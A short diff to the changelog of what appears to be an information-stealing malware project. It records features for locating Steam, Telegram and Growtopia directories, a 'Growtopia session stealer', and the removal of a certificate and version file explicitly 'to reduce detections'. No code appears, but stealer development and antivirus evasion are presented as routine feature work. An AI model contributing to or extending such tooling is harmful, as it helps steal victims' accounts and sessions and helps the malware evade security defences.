@@ -2,6 +2,7 @@
 ###
 * Now searches for Steam, Telegram and Growtopia directories from Start Menu.
 * Changed configuration file from 'config.ini' to 'config.json'.
+* Removed certificate and version file to reduce detections.
 
 ### 03/07/2023
 * Added Growtopia session stealer.
